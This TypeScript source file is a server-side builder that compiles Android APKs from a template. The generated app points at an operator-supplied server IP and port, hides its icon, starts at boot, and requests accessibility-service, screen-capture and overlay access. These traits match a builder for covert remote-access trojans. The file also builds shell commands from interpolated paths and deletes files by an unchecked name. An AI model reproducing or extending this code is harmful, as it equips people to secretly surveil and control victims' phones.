
import { spawn, exec } from "child_process";
import { promises as fs } from "fs";
import { join, resolve } from "path";
import type { ApkConfiguration } from "@shared/schema";
import { storage } from "../storage";

export interface BuildProgress {
  stage: string;
  progress: number;
  message: string;
  error?: string;
}

export class APKBuilder {
  private buildDir = resolve("builds");
  private templateDir = resolve("android-template");
  private sdkPath = process.env.ANDROID_SDK_ROOT || "/opt/android-sdk";

  constructor() {
    this.ensureBuildDir();
  }

  private async ensureBuildDir(): Promise<void> {
    try {
      await fs.mkdir(this.buildDir, { recursive: true });
    } catch (error) {
      console.error("Failed to create build directory:", error);
    }
  }

  async buildAPK(
    config: ApkConfiguration,
    onProgress: (progress: BuildProgress) => void
  ): Promise<string> {
    const buildId = `${config.id}-${Date.now()}`;
    const projectDir = join(this.buildDir, buildId);

    try {
      // Update build status
      await storage.updateApkConfiguration(config.id, {
        buildStatus: "building",
        buildProgress: 0,
      });

      onProgress({
        stage: "prepare",
        progress: 10,
        message: "Preparing build environment...",
      });

      // Copy template to build directory
      await this.copyTemplate(projectDir);

      onProgress({
        stage: "configure",
        progress: 25,
        message: "Configuring project...",
      });

      // Configure the project with user settings
      await this.configureProject(projectDir, config);

      onProgress({
        stage: "compile",
        progress: 50,
        message: "Compiling APK...",
      });

      // Build the APK
      const apkPath = await this.compileAPK(projectDir, config);

      onProgress({
        stage: "finalize",
        progress: 90,
        message: "Finalizing build...",
      });

      // Move APK to final location
      const finalApkPath = join(this.buildDir, `${config.appName}-${buildId}.apk`);
      await fs.copyFile(apkPath, finalApkPath);

      // Update configuration with final path
      await storage.updateApkConfiguration(config.id, {
        buildStatus: "completed",
        buildProgress: 100,
        apkPath: finalApkPath,
        buildDate: new Date(),
      });

      onProgress({
        stage: "complete",
        progress: 100,
        message: "Build completed successfully!",
      });

      // Cleanup temporary files
      await this.cleanup(projectDir);

      return finalApkPath;
    } catch (error) {
      console.error("APK build failed:", error);
      
      await storage.updateApkConfiguration(config.id, {
        buildStatus: "failed",
        buildError: error instanceof Error ? error.message : "Unknown error",
      });

      onProgress({
        stage: "error",
        progress: 0,
        message: "Build failed",
        error: error instanceof Error ? error.message : "Unknown error",
      });

      throw error;
    }
  }

  private async copyTemplate(targetDir: string): Promise<void> {
    await this.execCommand(`cp -r "${this.templateDir}" "${targetDir}"`);
  }

  private async configureProject(projectDir: string, config: ApkConfiguration): Promise<void> {
    // Update gradle.properties
    const gradlePropsPath = join(projectDir, "gradle.properties");
    const gradleProps = `
android.useAndroidX=true
android.enableJetifier=true
org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
org.gradle.parallel=true
org.gradle.caching=true
`;
    await fs.writeFile(gradlePropsPath, gradleProps);

    // Update build.gradle
    const buildGradlePath = join(projectDir, "build.gradle");
    const buildGradle = `
plugins {
    id 'com.android.application'
}

android {
    compileSdkVersion 34
    buildToolsVersion "34.0.0"

    defaultConfig {
        applicationId "${config.packageName}"
        minSdkVersion 21
        targetSdkVersion 34
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.10.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
}
`;
    await fs.writeFile(buildGradlePath, buildGradle);

    // Update AndroidManifest.xml
    const manifestPath = join(projectDir, "src/main/AndroidManifest.xml");
    const manifest = `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="${config.packageName}">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="${config.appName}"
        android:theme="@style/AppTheme">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name=".AccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="false">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <service
            android:name=".ScreenCaptureService"
            android:exported="false" />

        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="android.intent.action.PACKAGE_REPLACED" />
                <data android:scheme="package" />
            </intent-filter>
        </receiver>

    </application>
</manifest>`;
    await fs.writeFile(manifestPath, manifest);

    // Update strings.xml
    const stringsPath = join(projectDir, "src/main/res/values/strings.xml");
    const strings = `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">${config.appName}</string>
    <string name="server_ip">${config.serverIP}</string>
    <string name="server_port">${config.serverPort}</string>
    <string name="auto_start">${config.autoStart}</string>
    <string name="hide_icon">${config.hideIcon}</string>
    <string name="enable_logging">${config.enableLogging}</string>
</resources>`;
    await fs.writeFile(stringsPath, strings);

    // Update MainActivity.java with server configuration
    const mainActivityPath = join(projectDir, "src/main/java/com/smartcontrol/client/MainActivity.java");
    const mainActivityContent = await fs.readFile(mainActivityPath, "utf-8");
    const updatedMainActivity = mainActivityContent
      .replace(/DEFAULT_SERVER_HOST = ".*";/, `DEFAULT_SERVER_HOST = "${config.serverIP}";`)
      .replace(/DEFAULT_SERVER_PORT = \d+;/, `DEFAULT_SERVER_PORT = ${config.serverPort};`)
      .replace(/YOUR_REPLIT_URL\.replit\.dev/g, config.serverIP);
    await fs.writeFile(mainActivityPath, updatedMainActivity);

    // Update TCPClient.java with server configuration  
    const tcpClientPath = join(projectDir, "src/main/java/com/smartcontrol/client/TCPClient.java");
    const tcpClientContent = await fs.readFile(tcpClientPath, "utf-8");
    const updatedTcpClient = tcpClientContent
      .replace(/DEFAULT_SERVER_HOST = ".*";/, `DEFAULT_SERVER_HOST = "${config.serverIP}";`)
      .replace(/DEFAULT_SERVER_PORT = \d+;/, `DEFAULT_SERVER_PORT = ${config.serverPort};`)
      .replace(/YOUR_REPLIT_URL\.replit\.dev/g, config.serverIP);
    await fs.writeFile(tcpClientPath, updatedTcpClient);
  }

  private async compileAPK(projectDir: string, config: ApkConfiguration): Promise<string> {
    // Build the APK using Gradle
    const gradlewPath = join(projectDir, "gradlew");
    await this.execCommand(`chmod +x "${gradlewPath}"`);
    
    await this.execCommand(`cd "${projectDir}" && ./gradlew assembleRelease`, {
      env: {
        ...process.env,
        ANDROID_SDK_ROOT: this.sdkPath,
        JAVA_HOME: process.env.JAVA_HOME || "/usr/lib/jvm/java-11-openjdk-amd64",
      },
    });

    const apkPath = join(projectDir, "app/build/outputs/apk/release/app-release.apk");
    
    // Verify APK exists
    try {
      await fs.access(apkPath);
      return apkPath;
    } catch (error) {
      throw new Error(`APK not found at expected location: ${apkPath}`);
    }
  }

  private async cleanup(projectDir: string): Promise<void> {
    try {
      await this.execCommand(`rm -rf "${projectDir}"`);
    } catch (error) {
      console.warn("Failed to cleanup build directory:", error);
    }
  }

  private execCommand(command: string, options: any = {}): Promise<string> {
    return new Promise((resolve, reject) => {
      exec(command, options, (error, stdout, stderr) => {
        if (error) {
          reject(new Error(`Command failed: ${command}\n${stderr?.toString() || error.message}`));
        } else {
          resolve(stdout.toString());
        }
      });
    });
  }

  async getAvailableAPKs(): Promise<string[]> {
    try {
      const files = await fs.readdir(this.buildDir);
      return files.filter(file => file.endsWith('.apk'));
    } catch (error) {
      return [];
    }
  }

  async deleteAPK(filename: string): Promise<boolean> {
    try {
      const filePath = join(this.buildDir, filename);
      await fs.unlink(filePath);
      return true;
    } catch (error) {
      return false;
    }
  }
}

export const apkBuilder = new APKBuilder();
